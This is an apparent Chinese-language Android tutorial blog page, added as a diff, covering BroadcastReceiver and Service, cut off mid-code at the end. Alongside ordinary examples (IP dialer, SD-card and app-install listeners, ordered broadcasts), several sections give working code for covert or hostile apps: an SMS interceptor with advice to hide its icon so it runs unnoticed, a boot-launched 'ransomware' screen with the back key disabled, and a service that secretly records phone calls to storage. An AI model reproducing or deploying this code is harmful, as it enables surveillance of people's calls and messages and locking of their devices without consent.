@@ -1,0 +1,1331 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Android基础," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="导语
+ 07 广播 BroadcastReceiver 介绍">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Android基础--广播 BroadcastReceiver">
+<meta property="og:url" content="http://yoursite.com/2017/02/13/基础--广播 BroadcastReceiver/index.html">
+<meta property="og:site_name" content="个人博客">
+<meta property="og:description" content="导语
+ 07 广播 BroadcastReceiver 介绍">
+<meta property="og:updated_time" content="2017-02-25T03:26:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Android基础--广播 BroadcastReceiver">
+<meta name="twitter:description" content="导语
+ 07 广播 BroadcastReceiver 介绍">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/02/13/基础--广播 BroadcastReceiver/"/>
+
+
+
+
+
+  <title> Android基础--广播 BroadcastReceiver | 个人博客 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">个人博客</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/基础--广播 BroadcastReceiver/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="yass">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="个人博客">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Android基础--广播 BroadcastReceiver
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:45:06+08:00">
+                2017-02-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/02/13/基础--广播 BroadcastReceiver/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/13/基础--广播 BroadcastReceiver/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h4><blockquote>
+<p> 07 广播 BroadcastReceiver 介绍  </p>
+</blockquote>
+<a id="more"></a> 
+<h1 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h1><ul>
+<li>广播的概念<ul>
+<li>现实：电台通过发送广播发布消息，买个收音机，就能收听<ul>
+<li>电台基站（官方，非官方）  –&gt;广播信号</li>
+<li>收音机                  –&gt;接受信号</li>
+</ul>
+</li>
+<li>Android：系统在产生某个事件时发送广播，应用程序使用广播接收者接收这个广播，就知道系统产生了什么事件。</li>
+</ul>
+</li>
+</ul>
+<p>##android下广播机制设计的目的</p>
+<ul>
+<li><p>手机里面Android系统在运行的过程中会有很多事件。</p>
+<ul>
+<li>手机电量不足</li>
+<li>手机开机</li>
+<li>有人给你发送了短信</li>
+<li>你向外拨打了电话</li>
+<li>手机启动完毕</li>
+<li>屏幕解锁</li>
+</ul>
+</li>
+<li><p>google的android系统把常用的事件，做成了广播机制。一旦事件产生了，就向全系统发送一个广播消息。应用程序使用广播接收者接收这个广播，就知道系统产生了什么事件。</p>
+</li>
+</ul>
+<p>####如何使用内置的广播接受者       </p>
+<p>####(创建类似于Activity,四大组件都如此,先.继承一个类 后.配置一个清单)</p>
+<ol>
+<li>创建一个类继承 BroadcastReceiver （类似买了收音机）</li>
+<li><p>在清单中配置广播接受者（装上电池，配好频道）</p>
+<pre><code>&lt;receiver android:name=&quot;com.itheima.ipdail.IpDailBroadcastReceiver&quot;&gt;
+    &lt;intent-filter &gt;
+        &lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre></li>
+<li>特殊的广播接受者，需要添加权限(如：开机自启动权限)。</li>
+<li>重写BroadcastReceiver类的onReceive(Context context, Intent intent)方法。</li>
+<li><p>通过intent拿到数据，并可以进行修改</p>
+<p> public class CallReceiver extends BroadcastReceiver{</p>
+<pre><code>//当收到广播时，此方法调用
+@Override
+public void onReceive(Context context, Intent intent) {
+    //添加ip线路
+    //1.拿到用户拨打的号码，修改号码添加ip线路
+    String number = getResultData();
+    number = &quot;17951&quot; + number;
+
+    //2.把新号码设置进广播中
+    setResultData(number);
+
+    //此代码无效，因为打电话应用的广播接收者是最终接收者
+    //abortBroadcast();//阻止其他广播接收者接收这条广播，可以理解为拦截广播
+}
+</code></pre><p> }</p>
+</li>
+</ol>
+<hr>
+<p>#广播接收者</p>
+<ul>
+<li>广播发出时，会先自己定义意图过滤器action和数据data(有时只定义意图过滤器action),发出广播后，被广播接收者接收。</li>
+<li>当一条广播被发送出来时，系统会在所有清单文件中遍历(遍历所有，哪怕找到了，也还要继续遍历，直到把所有清单文件遍历一遍)，通过匹配意图过滤器找到能接收这条广播的广播接收者</li>
+<li>广播接收者一旦接收到了广播，就开始执行广播接受者里面的代码，若没有接收到匹配的广播，代码就不会执行</li>
+</ul>
+<p>###一些常量</p>
+<pre><code>android.intent.action.NEW_OUTGOING_CALL:外拨电话
+android.intent.action.PACKAGEADDED：应用被安装
+android.intent.action.PACKAGEREMOVED：应用被移除
+android.intent.action.PACKAGE_REPLACED：应用被替换
+android.intent.action.MEDIAMOUNTED：sd卡被装载了
+android.intent.action.MEDIAREMOVED：sd卡被移除了
+android.intent.action.MEDIA_UNMOUNTED：sd卡未挂载
+android.intent.action.BOOTCOMPLETED：一旦设备完成启动时触发。需要RECEIVE_BOOT_COMPLETED权限。
+Mount：安装，登上
+Boot：引导程序，启动，引导
+</code></pre><p>##不同android版本的安全升级</p>
+<ul>
+<li><p>2.3以及2.3一下的版本，任何广播接受者apk只要被装到手机就立刻生效。不管应用程序进程是否运行。</p>
+</li>
+<li><p>4.0以及4.0以上的版本，要求应用程序必须有ui界面（activity） 广播接受者才能生效，如果用户点击了强行停止，应用程序就完全关闭了，广播接受者就失效了。如果用户没有点击过强行停止，即使应用程序进程不存在，也会自动的运行起来。</p>
+</li>
+</ul>
+<hr>
+<p>#IP拨号器</p>
+<blockquote>
+<p>原理：接收拨打电话的广播，修改广播内携带的电话号码</p>
+<ul>
+<li>定义广播接收者接收打电话广播</li>
+</ul>
+</blockquote>
+<pre><code>public class CallReceiver extends BroadcastReceiver {
+
+    //当广播接收者接收到广播时，此方法会调用
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        //拿到用户拨打的号码
+        String number = getResultData();
+        //修改广播内的号码，//同时把新号码设置进广播中
+        setResultData(&quot;17951&quot; + number);
+    }
+}
+</code></pre><ul>
+<li><p>在清单文件中定义该广播接收者接收的广播类型</p>
+<pre><code>&lt;receiver android:name=&quot;com.itheima.ipdialer.CallReceiver&quot;&gt;
+    &lt;intent-filter &gt;
+        &lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre></li>
+<li><p>接收打电话广播需要权限</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.PROCESS_OUTGOING_CALLS&quot;/&gt;
+</code></pre></li>
+<li>即使广播接收者的进程没有启动，当系统发送的广播可以被该接收者接收时，系统会自动启动该接收者所在的进程</li>
+</ul>
+<hr>
+<p>#短信拦截器</p>
+<blockquote>
+<p>系统收到短信时会产生一条广播，广播中包含了短信的号码和内容</p>
+</blockquote>
+<ul>
+<li><p>1.定义广播接收者接收短信广播</p>
+<pre><code>public class SmsReceiver extends BroadcastReceiver {
+
+    //intent:此对象就是广播中包含的那个intent
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        //从广播中取出短信的内容
+        Bundle bundle = intent.getExtras();
+        //数组中的每个元素，就是一条短信
+        Object[] objects = (Object[]) bundle.get(&quot;pdus&quot;);
+
+        for (Object object : objects) {
+            //把object转换成短信对象
+            SmsMessage sms = SmsMessage.createFromPdu((byte[])object);
+            //获取短信发送者的号码
+            String address = sms.getOriginatingAddress();
+            //获取短信的内容
+            String body = sms.getMessageBody();
+
+            if(address.equals(&quot;138438&quot;)){
+                //阻止其他广播接收者接收这条广播，可以理解为拦截广播
+                abortBroadcast();
+            }
+            System.out.println(address + &quot;:&quot; + body);
+        }
+    }
+}
+</code></pre></li>
+<li>要理解：系统创建广播时，把短信存放到一个数组，然后把数据以pdus为key存入bundle，再把bundle存入intent</li>
+<li><p>2.清单文件中配置广播接收者接收的广播类型，注意要设置优先级属性，要保证优先级高于短信应用，才可以实现拦截</p>
+<pre><code>&lt;receiver android:name=&quot;com.itheima.smslistener.SmsReceiver&quot;&gt;
+    &lt;intent-filter android:priority=&quot;1000&quot;&gt;
+        &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre></li>
+<li><p>3.添加权限</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;/&gt;
+</code></pre></li>
+<li><p>4.0之后，广播接收者所在的应用必须启动过一次，才能生效，第一次部署进手机时，要保留activity入口，让该应用执行一次，短信拦截器就运行在手机里，之后删除activity入口(就是删除快捷图标)这视为更新，神不知鬼不觉，拦截器就运行在手机里了。</p>
+</li>
+<li>4.0之后，如果广播接收者所在应用被用户手动关闭了，那么再也不会启动了，直到用户再次手动启动该应用</li>
+</ul>
+<hr>
+<p>#监听SD卡状态</p>
+<ul>
+<li>清单文件中定义广播接收者接收的类型，监听SD卡常见的三种状态，所以广播接收者需要接收三种广播<pre><code>&lt;receiver android:name=&quot;com.itheima.listensd.SDStatusReceiver&quot;&gt;
+    &lt;intent-filter &gt;
+        &lt;action android:name=&quot;android.intent.action.MEDIA_MOUNTED&quot;/&gt;
+        &lt;action android:name=&quot;android.intent.action.MEDIA_UNMOUNTED&quot;/&gt;
+        &lt;action android:name=&quot;android.intent.action.MEDIA_REMOVED&quot;/&gt;
+        &lt;data android:scheme=&quot;file&quot;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre></li>
+<li><p>广播接收者的定义    </p>
+<pre><code>/**
+  * 此广播接收者用于监听SD卡状态
+  * 吐司提示SD卡的状态
+  * @author Administrator
+  *
+  */
+ public class SDStatusReceiver extends BroadcastReceiver {
+
+     @Override
+     public void onReceive(Context context, Intent intent) {
+
+         //判断收到的是什么广播
+         String action = intent.getAction();
+
+         if (intent.ACTION_MEDIA_MOUNTED.equals(action)) {
+             Toast.makeText(context, &quot;SD卡可用&quot;, 0).show();
+         } else if(intent.ACTION_MEDIA_UNMOUNTED.equals(action)){
+             Toast.makeText(context, &quot;SD卡不可用&quot;, 0).show();
+         }else if(intent.ACTION_MEDIA_REMOVED.equals(action)){
+             Toast.makeText(context, &quot;SD卡被移除&quot;, 0).show();
+         }
+
+     }
+
+ }
+</code></pre></li>
+</ul>
+<hr>
+<p>#勒索软件</p>
+<ul>
+<li><p>1.定义广播接收者</p>
+<pre><code>/**
+ * 此广播接收器用于开机启动勒索软件
+ * @author Administrator
+ *
+ */
+public class BootReceiver extends BroadcastReceiver {
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+
+        //创建意图对象,准备开启新的Activity
+        Intent it = new Intent(context,MainActivity.class);
+        //创建新的任务栈，存启动的Activity
+        it.setFlags(intent.FLAG_ACTIVITY_NEW_TASK);
+        //启动Activity
+        context.startActivity(it);
+    }
+}
+</code></pre></li>
+<li>2.清单文件中配置接收开机广播<pre><code>&lt;receiver android:name=&quot;com.itheima.lesuo.BootReceiver&quot;&gt;
+    &lt;intent-filter &gt;
+        &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre></li>
+<li>3.权限    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"></uses-permission></li>
+<li><p>4.接收开机广播，在广播接收者中启动该勒索Activity，另外设置返回键失效</p>
+<pre><code>public class MainActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+
+    @Override
+    public boolean onCreateOptionsMenu(Menu menu) {
+        // Inflate the menu; this adds items to the action bar if it is present.
+        getMenuInflater().inflate(R.menu.main, menu);
+        return true;
+    }
+
+    @Override
+    public void onBackPressed() {
+        //注掉调用父类方法：此Activity返回键失效
+        //super.onBackPressed();
+    }
+}
+</code></pre></li>
+</ul>
+<ul>
+<li>注意：</li>
+<li>因为广播接收者的启动，并不会创建任务栈，而在广播接收者中需要启动Activity，那么没有任务栈，就无法启动activity</li>
+<li><p>手动设置创建新任务栈的flag</p>
+<pre><code>it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+</code></pre></li>
+</ul>
+<hr>
+<p>#监听应用的安装、卸载、更新</p>
+<blockquote>
+<p>原理：应用在安装卸载更新时，系统会发送广播，广播里会携带应用的包名</p>
+<ul>
+<li>清单文件定义广播接收者接收的类型，因为要监听应用的三个动作，所以需要接收三种广播<pre><code>&lt;receiver android:name=&quot;com.itheima.app.AppReceiver&quot;&gt;
+     &lt;intent-filter &gt;
+         &lt;action android:name=&quot;android.intent.action.PACKAGE_ADDED&quot;/&gt;
+         &lt;action android:name=&quot;android.intent.action.PACKAGE_REPLACED&quot;/&gt;
+         &lt;action android:name=&quot;android.intent.action.PACKAGE_REMOVED&quot;/&gt;
+         &lt;data android:scheme=&quot;package&quot;/&gt;
+     &lt;/intent-filter&gt;
+ &lt;/receiver&gt;
+</code></pre></li>
+</ul>
+</blockquote>
+<ul>
+<li>广播接收者的定义</li>
+</ul>
+<pre><code>/**
+ * 此广播接收者用于监听应用安装卸载
+ * @author Administrator
+ *
+ */
+public class AppReceiver extends BroadcastReceiver {
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+
+        String action = intent.getAction();
+
+        Uri uri = intent.getData();
+
+        if (intent.ACTION_PACKAGE_ADDED.equals(action)) {
+            Toast.makeText(context, uri+&quot;安装了&quot;, 0).show();
+        }else if(intent.ACTION_PACKAGE_REMOVED.equals(action)){
+            Toast.makeText(context, uri+&quot;卸载了&quot;, 0).show();
+        }else if(intent.ACTION_PACKAGE_REPLACED.equals(action)){
+            Toast.makeText(context, uri+&quot;更新了&quot;, 0).show();
+        }
+    }
+}
+</code></pre><hr>
+<p>#广播的两种类型</p>
+<ul>
+<li><p>无序广播：所有跟广播的intent匹配的广播接收者都可以收到该广播，并且是没有先后顺序（同时收到）</p>
+<pre><code>//发出无序广播:
+public void click(View v){
+    //发送自定义广播
+    //1.定义意图对象
+    Intent intent = new Intent();
+    //2.设置action
+    intent.setAction(&quot;com.itheima.a1&quot;);
+    //3.发送广播
+    sendBroadcast(intent);
+}
+</code></pre></li>
+<li><p>有序广播：所有跟广播的intent匹配的广播接收者都可以收到该广播，但是会按照广播接收者的优先级来决定接收的先后顺序</p>
+<ul>
+<li><p>sendOrderedBroadcast();</p>
+<ul>
+<li>参数1：intent</li>
+<li>参数2： String receiverPermission 应该是权限</li>
+<li>参数3：最终接收者</li>
+<li>参数4：Handler消息处理器</li>
+<li>参数5：int数据</li>
+<li>参数6：String数据</li>
+<li><p>参数7：Bundles数据对象</p>
+<pre><code>public void fdm(View v){
+     //发送有序广播
+     Intent intent = new Intent();
+     intent.setAction(&quot;com.itheima.fdm&quot;);
+
+     //发送有序广播
+     //resultReceiver:最终接收者，此广播接收者会在最后一个收到广播，并且一定会收到
+     sendOrderedBroadcast(intent, null, new MyReceiver(), null, 0, &quot;每人发100斤大米&quot;, null);
+ }
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>优先级的定义：<ul>
+<li>-1000~1000</li>
+</ul>
+</li>
+<li>最终接收者：所有广播接收者都接收到广播之后，它才接收，并且一定会接收</li>
+</ul>
+</li>
+</ul>
+<pre><code>     public class MainActivity extends Activity {
+
+            @Override
+            protected void onCreate(Bundle savedInstanceState) {
+                super.onCreate(savedInstanceState);
+                setContentView(R.layout.activity_main);
+            }
+
+
+            public void fdm(View v){
+                //发送有序广播
+                Intent intent = new Intent();
+                intent.setAction(&quot;com.itheima.fdm&quot;);
+
+                //发送有序广播
+                //resultReceiver:最终接收者，此广播接收者会在最后一个收到广播，并且一定会收到
+                sendOrderedBroadcast(intent, null, new MyReceiver(), null, 0, &quot;每人发100斤大米&quot;, null);
+            }
+
+            //定义最终接收者
+            class MyReceiver extends BroadcastReceiver{
+
+                @Override
+                public void onReceive(Context context, Intent intent) {
+                    String order = getResultData();
+                    System.out.println(&quot;反贪局收到文件&quot; + order);
+
+                }
+
+            }
+        }
+
+* abortBroadcast();:阻止其他接收者接收这条广播，类似拦截，只有有序广播可以被拦截
+</code></pre><p>##android应用程序的四大组件：</p>
+<ul>
+<li>activity 界面</li>
+<li>content provider 内容提供者 暴露应用程序私有的数据</li>
+<li>broadcast receiver 接受广播消息</li>
+<li>service 后台的服务<blockquote>
+<p>四大组件都要在清单文件配置，特殊广播接受者（代码，清单文件）</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<p>#二、Service</p>
+<ul>
+<li>一个组件长期后台运行，没有界面。</li>
+<li>就是默默运行在后台的组件，可以理解为是没有前台的activity，适合用来运行不需要前台界面的代码</li>
+<li>服务可以被手动关闭，不会重启，但是如果被自动关闭，内存充足就会重启</li>
+<li>startService启动服务的生命周期<ul>
+<li>onCreate()–&gt;onStartCommand()–&gt;onDestroy()</li>
+</ul>
+</li>
+<li>重复的调用startService会导致onStartCommand被重复调用</li>
+</ul>
+<p>####如何创建一个服务(创建类似于Activity,四大组件都如此,1.继承一个 2.配置一个)</p>
+<ol>
+<li>创建一个类继承Service </li>
+<li><p>配置服务清单</p>
+<pre><code>&lt;service android:name=&quot;com.itheima.service.MyService&quot;&gt;&lt;/service&gt;
+</code></pre></li>
+<li>特殊的服务，需要添加权限。</li>
+<li>重写类的onBind(Intent intent)方法。<ul>
+<li>及onCreate()方法–&gt;onStartCommand()方法–&gt;onDestroy()方法</li>
+</ul>
+</li>
+<li><p>通过主页面通过intent开启关闭服务</p>
+<pre><code>public class MainActivity extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+    //点击事件：开启MyService服务
+    public void click1(View v){
+        //1.创建意图
+        Intent intent = new Intent(this,MyService.class);
+        //2.启动服务
+        startService(intent);
+    }
+    //点击事件：停止MyService服务
+    public void click2(View v){
+        //1.创建意图
+        Intent intent = new Intent(this,MyService.class);
+        //2.停止服务
+        stopService(intent);
+
+    }
+}
+</code></pre></li>
+</ol>
+<hr>
+<h1 id="进程优先级"><a href="#进程优先级" class="headerlink" title="进程优先级"></a>进程优先级</h1><ol>
+<li>前台进程：拥有一个正在与用户交互的activity（onResume方法被调用）的进程</li>
+<li>可见进程：拥有一个非前台，但是对用户可见的activity（onPause方法被调用）的进程</li>
+<li>服务进程：拥有一个通过startService方法启动的服务的进程</li>
+<li>后台进程：拥有一个后台activity（onStop方法被调用）的进程</li>
+<li>空进程：没有拥有任何活动的应用组件的进程，也就是没有任何服务和activity在运行</li>
+</ol>
+<hr>
+<p>#电话窃听器</p>
+<p>##音频捕获</p>
+<ul>
+<li>首先需要一个手机电话管理的服务 TelephonyManager</li>
+</ul>
+<ol>
+<li><p>创建 android.media.MediaRecorder.</p>
+<pre><code>mediaRecorder= new MediaRecorder();
+</code></pre></li>
+<li><p>设置音频源</p>
+<pre><code>mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);//设置音频源来自麦克风，只能录自己麦克风单方面的话
+
+(MediaRecorder.AudioSource.VOICE_CALL)//录双方通话，但是只有部分国产手机支持。
+</code></pre></li>
+<li><p>设置音频文件的编码格式</p>
+<pre><code>mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
+</code></pre></li>
+<li><p>设置保存文件的路径</p>
+<pre><code>mediaRecorder.setOutputFile(&quot;/sdcard/temp.mp4&quot;);
+</code></pre></li>
+<li><p>设置音频的编码方式</p>
+<pre><code>mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+</code></pre></li>
+<li><p>准备开始录音</p>
+<pre><code>mediaRecorder.prepare() ;
+</code></pre></li>
+<li><p>开始录音</p>
+<pre><code>start()；
+</code></pre></li>
+<li><p>停止录音</p>
+<pre><code>stop();
+</code></pre></li>
+<li><p>释放资源</p>
+<pre><code>release();
+</code></pre></li>
+</ol>
+<ul>
+<li><p>另外：录音使用下面的两个权限</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
+&lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot;/&gt;
+</code></pre></li>
+</ul>
+<p>##电话窃听器</p>
+<ul>
+<li><p>电话状态：空闲、响铃、接听</p>
+</li>
+<li><p>1.获取电话管理器，设置侦听</p>
+<ul>
+<li>设置侦听有两个参数</li>
+<li>参数1:手机状态监听器，需继承PhoneStateListener类，重写里面的方法，实现对手机状态的监听，里面有许多方法</li>
+<li><p>参数2：设置监听器只监听什么数据，无论你在手机状态监听器中重写了多少个方法，通过参数2，监听器只监听所设置的参数对应的数据，通过监听数据的变化，去调用不同的方法</p>
+<pre><code>@Override
+public void onCreate() {
+    super.onCreate();
+    //获取电话管理器
+    TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+    //设置侦听
+    //arg0:手机状态监听器
+    //arg1:设置监听器只监听什么数据
+    tm.listen(new Mylistener(), PhoneStateListener.LISTEN_CALL_STATE);
+}
+</code></pre></li>
+</ul>
+</li>
+<li><p>2.侦听对象的实现</p>
+<pre><code>private MediaRecorder recorder;
+class Mylistener extends PhoneStateListener{
+</code></pre></li>
+</ul>
+<pre><code>    //电话状态改变时，此方法调用
+    @Override
+    public void onCallStateChanged(int state, String incomingNumber) {
+        // TODO Auto-generated method stub
+        super.onCallStateChanged(state, incomingNumber);
+        switch (state) {
+        case TelephonyManager.CALL_STATE_IDLE://空闲
+            if(recorder != null){
+                recorder.stop();
+                //释放占用的资源
+                recorder.release();
+                recorder = null;
+            }
+            break;
+        case TelephonyManager.CALL_STATE_RINGING://响铃
+            if(recorder == null){
+                recorder = new MediaRecorder();
+                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                recorder.setOutputFile(&quot;sdcard/voice.3gp&quot;);
+                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                try {
+                    //准备完毕后，随时可以录音
+                    recorder.prepare();
+                } catch (Exception e) {
+                    // TODO Auto-generated catch block
+                    e.printStackTrace();
+                }
+            }
+            break;
+        case TelephonyManager.CALL_STATE_OFFHOOK://摘机
+            if(recorder != null){
+                recorder.start();
+            }
+            break;
+
+        }
+    }
+
+}
+</code></pre><ul>
+<li><p>3.添加权限，</p>
+<ul>
+<li>读取用户手机状态权限</li>
+<li>写入SD卡权限</li>
+<li>开机自启动权限</li>
+<li><p>记录音频权限</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
+&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;
+&lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt;
+&lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot;/&gt;
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<p>–电话窃听器示例：—-</p>
+<pre><code>/**
+ * 此RecorderService服务：用于监听手机状态改变,实现电话窃听器功能
+ * 1、获取电话管理器，并对手机设置监听
+ * 2、定义一个手机监听器，实现电话窃听器功能
+ * 
+ * @author Administrator
+ *
+ */
+public class RecorderService extends Service {
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        // TODO Auto-generated method stub
+        return null;
+    }
+
+    @Override
+    public void onCreate() {
+        // TODO Auto-generated method stub
+        super.onCreate();
+        //获取电话管理器
+        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+        //设置侦听
+        //arg1:设置监听器只监听什么数据
+        tm.listen(new Mylistener(), PhoneStateListener.LISTEN_CALL_STATE);
+    }
+
+    //定义多媒体录音对象
+    private MediaRecorder recorder;
+    class Mylistener extends PhoneStateListener{
+
+        //电话状态改变时，此方法调用
+        @Override
+        public void onCallStateChanged(int state, String incomingNumber) {
+            // TODO Auto-generated method stub
+            super.onCallStateChanged(state, incomingNumber);
+            switch (state) {
+            case TelephonyManager.CALL_STATE_IDLE://空闲
+                if(recorder != null){
+                    //停止录音
+                    recorder.stop();
+                    //释放占用的资源
+                    recorder.release();
+                    recorder = null;
+                }
+                break;
+            case TelephonyManager.CALL_STATE_RINGING://响铃
+                if(recorder == null){
+                    //获取多媒体录音对象
+                    recorder = new MediaRecorder();
+                    //设置音频源,MIC只能设置音频源来自麦克风，只能录自己麦克风单方面的话
+                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                    //设置音频文件的编码格式
+                    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                    //设置保存文件的路径
+                    recorder.setOutputFile(&quot;sdcard/voice.3gp&quot;);
+                    //设置音频的编码方式
+                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                    try {
+                        //准备完毕后，随时可以录音,准备开始录音了
+                        recorder.prepare();
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
